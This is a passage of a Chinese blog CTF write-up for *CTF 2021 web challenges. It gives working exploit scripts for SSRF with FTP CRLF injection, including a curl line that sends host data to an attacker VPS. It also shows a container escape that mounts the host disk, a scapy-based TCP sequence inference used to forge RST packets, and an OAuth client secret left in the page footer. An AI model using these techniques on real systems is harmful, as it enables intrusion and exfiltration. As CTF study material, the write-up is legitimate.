class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/><span class="line">30</span><br/><span class="line">31</span><br/><span class="line">32</span><br/><span class="line">33</span><br/><span class="line">34</span><br/><span class="line">35</span><br/><span class="line">36</span><br/><span class="line">37</span><br/><span class="line">38</span><br/><span class="line">39</span><br/><span class="line">40</span><br/><span class="line">41</span><br/><span class="line">42</span><br/><span class="line">43</span><br/><span class="line">44</span><br/><span class="line">45</span><br/><span class="line">46</span><br/><span class="line">47</span><br/><span class="line">48</span><br/><span class="line">49</span><br/><span class="line">50</span><br/><span class="line">51</span><br/><span class="line">52</span><br/><span class="line">53</span><br/><span class="line">54</span><br/><span class="line">55</span><br/><span class="line">56</span><br/><span class="line">57</span><br/><span class="line">58</span><br/><span class="line">59</span><br/><span class="line">60</span><br/><span class="line">61</span><br/><span class="line">62</span><br/><span class="line">63</span><br/><span class="line">64</span><br/><span class="line">65</span><br/><span class="line">66</span><br/><span class="line">67</span><br/><span class="line">68</span><br/><span class="line">69</span><br/><span class="line">70</span><br/><span class="line">71</span><br/><span class="line">72</span><br/><span class="line">73</span><br/><span class="line">74</span><br/><span class="line">75</span><br/><span class="line">76</span><br/><span class="line">77</span><br/><span class="line">78</span><br/><span class="line">79</span><br/><span class="line">80</span><br/><span class="line">81</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br/><span class="line"><span class="keyword">import</span> requests</span><br/><span class="line"><span class="keyword">import</span> socket</span><br/><span class="line"><span class="keyword">import</span> string</span><br/><span class="line"><span class="keyword">import</span> random</span><br/><span class="line"><span class="keyword">import</span> threading</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br/><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br/><span class="line">    <span class="keyword">return</span> <span class="string">&#39;&#39;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_port_cmd</span>(<span class="params">host</span>):</span></span><br/><span class="line">    host, port = host.split(<span class="string">&#39;:&#39;</span>)</span><br/><span class="line">    port = <span class="built_in">int</span>(port)</span><br/><span class="line">    <span class="keyword">return</span> <span class="string">&#39;PORT &#39;</span> + <span class="string">&#39;,&#39;</span>.join(host.split(<span class="string">&#39;.&#39;</span>) + [<span class="built_in">str</span>(port // <span class="number">256</span>), <span class="built_in">str</span>(port - port // <span class="number">256</span> * <span class="number">256</span>)])</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line">a = <span class="string">&#39;http://52.163.52.206:8088&#39;</span></span><br/><span class="line">a = <span class="string">&#39;http://23.98.68.11:8088&#39;</span></span><br/><span class="line"></span><br/><span class="line">ftpd = <span class="string">&#39;172.20.0.2:8877&#39;</span></span><br/><span class="line">redis = <span class="string">&#39;172.20.0.4:6379&#39;</span></span><br/><span class="line">mongo = <span class="string">&#39;172.20.0.5:27017&#39;</span></span><br/><span class="line"></span><br/><span class="line">bind = <span class="string">&#39;vps_ip:2334&#39;</span></span><br/><span class="line">targ = mongo</span><br/><span class="line"></span><br/><span class="line"><span class="keyword">from</span> mongo <span class="keyword">import</span> get_mongo</span><br/><span class="line">request = get_mongo(<span class="string">&#39;curl vps_ip:1234/ -H &#34;Host: `ip a|base64`&#34;&#39;</span>)</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">url</span>):</span></span><br/><span class="line">    page = requests.post(a + <span class="string">&#39;/login&#39;</span>, data={</span><br/><span class="line">        <span class="string">&#39;username&#39;</span>: get_random_id(),</span><br/><span class="line">        <span class="string">&#39;password&#39;</span>: get_random_id(),</span><br/><span class="line">        <span class="string">&#39;avatar&#39;</span>: url,</span><br/><span class="line">        <span class="string">&#39;submit&#39;</span>: <span class="string">&#39;Go!&#39;</span></span><br/><span class="line">    }).text</span><br/><span class="line">    page = page[page.find(<span class="string">&#39;data:image/png;base64,&#39;</span>) +</span><br/><span class="line">                <span class="built_in">len</span>(<span class="string">&#39;data:image/png;base64,&#39;</span>):]</span><br/><span class="line">    page = page[:page.find(<span class="string">&#39;&#34;&#39;</span>)]</span><br/><span class="line">    <span class="keyword">try</span>:</span><br/><span class="line">        page = b64decode(page).decode()</span><br/><span class="line">    <span class="keyword">except</span>:</span><br/><span class="line">        page = b64decode(page)</span><br/><span class="line">    <span class="keyword">return</span> page</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span>(<span class="params">cmd</span>):</span></span><br/><span class="line">    cmd = <span class="string">&#39;\r\n&#39;</span>.join(cmd)</span><br/><span class="line">    <span class="keyword">return</span> ssrf(<span class="string">f&#39;&#39;&#39;ftp://fan:root<span class="subst">{cmd}</span>@<span class="subst">{ftpd}</span>/&#39;&#39;&#39;</span>)</span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendfile</span>(<span class="params">file</span>):</span></span><br/><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br/><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br/><span class="line">    sock.bind((<span class="string">&#39;0.0.0.0&#39;</span>, <span class="built_in">int</span>(bind.split(<span class="string">&#39;:&#39;</span>)[<span class="number">1</span>])))</span><br/><span class="line">    sock.listen(<span class="number">1</span>)</span><br/><span class="line">    (client, address) = sock.accept()</span><br/><span class="line">    <span class="built_in">print</span>(<span class="string">&#39;accepted&#39;</span>, address)</span><br/><span class="line">    client.send(file)</span><br/><span class="line">    <span class="built_in">print</span>(<span class="string">&#39;sent&#39;</span>)</span><br/><span class="line">    client.close()</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line">thread = threading.Thread(target=sendfile, args=(request,))</span><br/><span class="line">thread.start()</span><br/><span class="line"></span><br/><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#39;ftp://fan:root@<span class="subst">{ftpd}</span>/&#39;</span>))</span><br/><span class="line"></span><br/><span class="line">inject([<span class="string">&#39;TYPE I&#39;</span>, get_port_cmd(bind), <span class="string">&#39;STOR frankli&#39;</span>])</span><br/><span class="line">thread.join()</span><br/><span class="line"><span class="built_in">print</span>(<span class="string">&#39;uploaded&#39;</span>)</span><br/><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#39;ftp://fan:root@<span class="subst">{ftpd}</span>/&#39;</span>))</span><br/><span class="line"><span class="built_in">print</span>(<span class="string">&#39;replaying&#39;</span>)</span><br/><span class="line">inject([<span class="string">&#39;TYPE I&#39;</span>, get_port_cmd(targ), <span class="string">&#39;RETR frankli&#39;</span>])</span><br/><span class="line"><span class="built_in">print</span>(<span class="string">&#39;replayed&#39;</span>)</span><br/><span class="line"><span class="built_in">print</span>(requests.get(a, cookies={<span class="string">&#39;session&#39;</span>: <span class="string">&#39;1eb74496-98b9-4acc-94fb-75ba15ddb803&#39;</span>}).headers)</span><br/><span class="line"><span class="built_in">print</span>(<span class="string">&#39;requested&#39;</span>)</span><br/><span class="line">inject([<span class="string">&#39;RNFR frankli&#39;</span>, <span class="string">&#39;RNTO trash&#39;</span>])</span><br/><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#39;ftp://fan:root@<span class="subst">{ftpd}</span>/&#39;</span>))</span><br/></pre></td></tr></tbody></table></figure>    </div></div><h2 id="oh-my-socket">oh-my-socket</h2><p>不行，必须要公开处刑（逃</p><p>为什么题在放出来半个小时后就去fix了呢？</p><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/privileged.png" class="" title="特 权 阶 级"/><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br/><span class="line"></span><br/><span class="line"><span class="comment"># os.system(&#39;fdisk -l&#39;)</span></span><br/><span class="line">os.system(<span class="string">&#39;mkdir -p /mnt/test&#39;</span>)</span><br/><span class="line">os.system(<span class="string">&#39;mount /dev/vda1 /mnt/test&#39;</span>)</span><br/><span class="line"><span class="comment"># os.system(&#39;cat /mnt/test/lib/systemd/system/docker.*&#39;)</span></span><br/><span class="line"><span class="comment"># os.system(&#39;chroot /mnt/test find . -name &#34;oh-some-funny-code&#34;&#39;)</span></span><br/><span class="line">os.system(<span class="string">&#39;cat /mnt/test/var/lib/docker/overlay2/*/diff/server/oh-some-funny-code&#39;</span>)</span><br/><span class="line"><span class="comment"># os.system(&#39;chroot /mnt/test service docker status&#39;)</span></span><br/></pre></td></tr></tbody></table></figure><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/result.png" class="" title="结 束 了"/><p>还是我太善良了，没干什么坏事</p><p>这道题的正解是这样的：</p><p>观察题目，我们能发现server上有flag，还有一个flag service。还有一个client，client上还有任意文件读。我们作为webserver可以执行80秒任意代码，并且出题人贴心地为我们装上了scapy便于tcp包的构造。</p><p>这个flag service是阻塞式的服务，也就是说上一个人不断开的话下一个人连不了。然而client上的客户端在启动时就往server那里连了，并且双方都在<strong>阻塞</strong>地等待对方的数据（recv），而且还没设置超时，而且还每两分钟就重启一次。看上去有点不太可能实现的样子。<br/>但是当我们仔细观察client的源码，当收到了connection reset（RST）时，client会断开与server端的连接。也就是说我们需要伪造一个从server到client的RST，这时候才能轮到我们去连server。</p><p>众所周知（个鬼啊），TCP数据包伪造的重点在于其seq的值。</p><p>IP头中，Source IP Address，Destination IP Address我们都有，Protocol是TCP，别的无所谓，都是能自动构造好的<br/>TCP头中，Source Port，Destination Port我们也都有，client那边都bind好了，问题就在于：<br/>双方进行三次握手的过程如下：</p><ol><li>client向server发送一个同步包(SYN)，序列号为随机数A</li><li>1: 服务端响应(ACK)包，序列号为A+1; 2: 服务端发送同步包(SYN)，序列号为随机数B （即一个SYN-ACK包）</li><li>客户端发送响应包，序列号为B+1</li></ol><p>后面的数据包的sequence序列号只能落在<code>(last_seq, last_seq + recv_window)</code>这个范围内。</p><p>参考<a href="https://github.com/torvalds/linux/blob/19c329f6808995b142b3966301f217c831e7cf31/net/ipv4/tcp_input.c#L5609-L5628">linux源码:tcp_validate_incoming</a>，当然RFC或者计网课本都行，只是待会会用到这个</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">tcp_sequence</span><span class="params">(<span class="keyword">const</span> struct tcp_sock *tp, u32 seq, u32 end_seq)</span> </span>{</span><br/><span class="line">    <span class="keyword">return</span> !<span class="built_in">before</span>(end_seq, tp-&gt;rcv_wup) &amp;&amp; !<span class="built_in">after</span>(seq, tp-&gt;rcv_nxt + <span class="built_in">tcp_receive_window</span>(tp));</span><br/><span class="line">}</span><br/></pre></td></tr></tbody></table></figure><p>然后他俩就静默了。如果有任何一方发送了数据包，我们都有可能能抓到这个包，看到seq，这样这个题将绝杀，可是抓不得。</p><p>顺着出题人的思路，我们找到了几个paper，还找到了一次看雪论坛的演讲：</p><ol><li><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2012/10/ccs12-qian.pdf">https://www.microsoft.com/en-us/research/wp-content/uploads/2012/10/ccs12-qian.pdf</a></li><li><a href="https://web.eecs.umich.edu/~zmao/Papers/oakland12_TCP_sequence_number_inference.pdf">https://web.eecs.umich.edu/~zmao/Papers/oakland12_TCP_sequence_number_inference.pdf</a></li><li><a href="https://bbs.pediy.com/thread-245982.htm#:~:text=%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%94%BB%E5%87%BB%E5%8F%98%E7%A7%8D">https://bbs.pediy.com/thread-245982.htm#:~:text=第二个攻击变种</a></li></ol><p>根据上面的资料，我们继续往下跟刚才的linux中的<code>tcp_validate_incoming</code>，看到如果seq检查不通过的话进到的分支：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!th-&gt;rst) {</span><br/><span class="line">    <span class="keyword">if</span> (th-&gt;syn)</span><br/><span class="line">        <span class="keyword">goto</span> syn_challenge;</span><br/><span class="line">    <span class="keyword">if</span> (!<span class="built_in">tcp_oow_rate_limited</span>(<span class="built_in">sock_net</span>(sk), skb, LINUX_MIB_TCPACKSKIPPEDSEQ, &amp;tp-&gt;last_oow_ack_time))</span><br/><span class="line">        <span class="built_in">tcp_send_dupack</span>(sk, skb);</span><br/><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">tcp_reset_check</span>(sk, skb)) {</span><br/><span class="line">    <span class="built_in">tcp_reset</span>(sk, skb);</span><br/><span class="line">}</span><br/></pre></td></tr></tbody></table></figure><p>如果我们发的包不是RST，且不是SYN，如果seq检查不通过，且linux还不至于认为我们在flood它的话，会进到<code>tcp_send_dupack</code>，我们进去康康有什么</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcp_send_dupack</span><span class="params">(struct sock *sk, <span class="keyword">const</span> struct sk_buff *skb)</span> </span>{</span><br/><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcp_sock</span> *<span class="title">tp</span> =</span> <span class="built_in">tcp_sk</span>(sk);</span><br/><span class="line">    <span class="keyword">if</span> (<span class="built_in">TCP_SKB_CB</span>(skb)-&gt;end_seq != <span class="built_in">TCP_SKB_CB</span>(skb)-&gt;seq &amp;&amp;</span><br/><span class="line">        <span class="built_in">before</span>(<span class="built_in">TCP_SKB_CB</span>(skb)-&gt;seq, tp-&gt;rcv_nxt)) {</span><br/><span class="line">        <span class="built_in">NET_INC_STATS</span>(<span class="built_in">sock_net</span>(sk), LINUX_MIB_DELAYEDACKLOST);</span><br/><span class="line">        <span class="built_in">tcp_enter_quickack_mode</span>(sk, TCP_MAX_QUICKACKS);</span><br/><span class="line">        <span class="comment">// 省略</span></span><br/><span class="line">    }</span><br/><span class="line">    <span class="built_in">tcp_send_ack</span>(sk);</span><br/><span class="line">}</span><br/></pre></td></tr></tbody></table></figure><p>这个before的换行位置是真的阴间，我看了半天才发现这玩意在条件判断<strong>里头</strong><br/>这里有个很有意思的东西，<code>NET_INC_STATS(sock_net(sk), LINUX_MIB_DELAYEDACKLOST);</code><br/>就是说如果我们发送的这个数据包的seq比当前想要接收到的seq要小的话，linux会将DELAYEDACKLOST的值增加1。<br/>这个数值在哪里体现呢？在<code>/proc/&lt;pid&gt;/net/netstat</code>里头就有。</p><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/netstat.png" class="" title="netstat"/><p>也就是说我们不仅能知道我们的seq对还是错（这样我们需要遍历整个int32，不至于到天涯海角吧至少80秒是有了），而且还能知道seq大还是小。<br/>这样我们就能用小学二年级就学过的二分法，最多发32来个包，就能得到在窗口范围内的seq，进而伪造发送给client的RST包。</p><div class="spoiler collapsed">    <div class="spoiler-title">        参考脚本    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/><span class="line">9</span><br/><span class="line">10</span><br/><span class="line">11</span><br/><span class="line">12</span><br/><span class="line">13</span><br/><span class="line">14</span><br/><span class="line">15</span><br/><span class="line">16</span><br/><span class="line">17</span><br/><span class="line">18</span><br/><span class="line">19</span><br/><span class="line">20</span><br/><span class="line">21</span><br/><span class="line">22</span><br/><span class="line">23</span><br/><span class="line">24</span><br/><span class="line">25</span><br/><span class="line">26</span><br/><span class="line">27</span><br/><span class="line">28</span><br/><span class="line">29</span><br/><span class="line">30</span><br/><span class="line">31</span><br/><span class="line">32</span><br/><span class="line">33</span><br/><span class="line">34</span><br/><span class="line">35</span><br/><span class="line">36</span><br/><span class="line">37</span><br/><span class="line">38</span><br/><span class="line">39</span><br/><span class="line">40</span><br/><span class="line">41</span><br/><span class="line">42</span><br/><span class="line">43</span><br/><span class="line">44</span><br/><span class="line">45</span><br/><span class="line">46</span><br/><span class="line">47</span><br/><span class="line">48</span><br/><span class="line">49</span><br/><span class="line">50</span><br/><span class="line">51</span><br/><span class="line">52</span><br/><span class="line">53</span><br/><span class="line">54</span><br/><span class="line">55</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br/><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br/><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br/><span class="line"><span class="keyword">import</span> time</span><br/><span class="line"></span><br/><span class="line">ses = session()</span><br/><span class="line"><span class="comment"># conf.L3socket = L3RawSocket</span></span><br/><span class="line">client = <span class="string">&#39;172.21.0.3&#39;</span></span><br/><span class="line">server = <span class="string">&#39;172.21.0.2&#39;</span></span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">seq</span>):</span></span><br/><span class="line">    ip = IP(src=server, dst=client)</span><br/><span class="line">    tcp = TCP(sport=<span class="number">21587</span>, dport=<span class="number">7775</span>, flags=<span class="string">&#34;A&#34;</span>, seq=seq)</span><br/><span class="line">    pkt = ip / tcp / <span class="string">&#39;payload&#39;</span></span><br/><span class="line">    <span class="keyword">return</span> pkt</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">name</span>):</span></span><br/><span class="line">    <span class="keyword">return</span> ses.get(<span class="string">f&#39;http://<span class="subst">{client}</span>:5000/file&#39;</span>, params={<span class="string">&#39;name&#39;</span>: name}).text</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">text</span>):</span></span><br/><span class="line">    res = {}</span><br/><span class="line">    lines = text.split(<span class="string">&#39;\n&#39;</span>)</span><br/><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines), <span class="number">2</span>):</span><br/><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(lines[i]):</span><br/><span class="line">            <span class="keyword">break</span></span><br/><span class="line">        key, keys = lines[i].split(<span class="string">&#39;: &#39;</span>)</span><br/><span class="line">        key, vals = lines[i + <span class="number">1</span>].split(<span class="string">&#39;: &#39;</span>)</span><br/><span class="line">        res[key] = <span class="built_in">dict</span>(<span class="built_in">zip</span>(keys.split(<span class="string">&#39; &#39;</span>), vals.split(<span class="string">&#39; &#39;</span>)))</span><br/><span class="line">    <span class="keyword">return</span> res</span><br/><span class="line"></span><br/><span class="line"></span><br/><span class="line">netstat = parse(read(<span class="string">&#39;/proc/1/net/netstat&#39;</span>))</span><br/><span class="line">initial = netstat[<span class="string">&#39;TcpExt&#39;</span>][<span class="string">&#39;DelayedACKLost&#39;</span>]</span><br/><span class="line">seq_now = <span class="number">0</span></span><br/><span class="line"></span><br/><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">4</span>):</span><br/><span class="line">    send(build(i &lt;&lt; <span class="number">27</span>))</span><br/><span class="line">    netstat = parse(read(<span class="string">&#39;/proc/1/net/netstat&#39;</span>))</span><br/><span class="line">    <span class="keyword">if</span> netstat[<span class="string">&#39;TcpExt&#39;</span>][<span class="string">&#39;DelayedACKLost&#39;</span>] &gt; initial:</span><br/><span class="line">        seq_now = i &lt;&lt; <span class="number">27</span></span><br/><span class="line"></span><br/><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">31</span>):</span><br/><span class="line">    send(build(seq_now | (<span class="number">1</span> &lt;&lt; (<span class="number">31</span> - i))))</span><br/><span class="line">    netstat = parse(read(<span class="string">&#39;/proc/1/net/netstat&#39;</span>))</span><br/><span class="line">    <span class="keyword">if</span> netstat[<span class="string">&#39;TcpExt&#39;</span>][<span class="string">&#39;DelayedACKLost&#39;</span>] == initial + <span class="number">1</span>:</span><br/><span class="line">        seq_now |= (<span class="number">1</span> &lt;&lt; (<span class="number">31</span> - i))</span><br/><span class="line">    <span class="keyword">elif</span> netstat[<span class="string">&#39;TcpExt&#39;</span>][<span class="string">&#39;DelayedACKLost&#39;</span>] &gt; initial:</span><br/><span class="line">        <span class="comment"># conflict</span></span><br/><span class="line">        exit(<span class="number">1</span>)</span><br/><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br/><span class="line"></span><br/><span class="line"><span class="built_in">print</span>(seq_now)</span><br/></pre></td></tr></tbody></table></figure>    </div></div><p>然而出题人，对不起，你这还是有非预期。</p><p><s>我们再来仔细看看<code>docker-compose.yml</code>，看看是不是少了什么（自行看附件去）</s><br/><s>对的，没有depends_on，即使有可能也有问题。</s><br/>修正：docker-compose.yml中确实有depends_on，但是仍然有启动顺序上的问题。</p><p>请读到这篇博客的同学熟背下面链接里的东西<br/><a href="https://docs.docker.com/compose/startup-order/">https://docs.docker.com/compose/startup-order/</a></p><p>根据我个人的调查，一血的payload是这样的：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br/><span class="line">2</span><br/><span class="line">3</span><br/><span class="line">4</span><br/><span class="line">5</span><br/><span class="line">6</span><br/><span class="line">7</span><br/><span class="line">8</span><br/></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br/><span class="line"><span class="keyword">try</span>:</span><br/><span class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br/><span class="line">    tcpSerSock.connect((<span class="string">&#39;172.25.0.2&#39;</span>, <span class="number">21587</span>))</span><br/><span class="line">    tcpSerSock.send(<span class="string">b&#39;*ctf&#39;</span>)</span><br/><span class="line">    <span class="built_in">print</span>(tcpSerSock.recv(<span class="number">1280</span>))</span><br/><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br/><span class="line">    <span class="built_in">print</span>(<span class="string">&#34;ERROR&#34;</span>, e)</span><br/></pre></td></tr></tbody></table></figure><p>二血更是离谱，直接进去弹了个shell，上了一血的车，代码里直接就有flag（我也不知道为什么flag会在代码的注释里）</p><img src="https://blog.frankli.site/2021/01/18/Security/Writeup/*CTF-2021-Web/flag_in_py.png" class="" title="what??"/><p>。。。所以说，这是多么悲伤的故事</p><h2 id="总结">总结</h2><p>没有。</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"/><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"/><script src="/js/spoiler.js" type="text/javascript" async=""></script></body></html>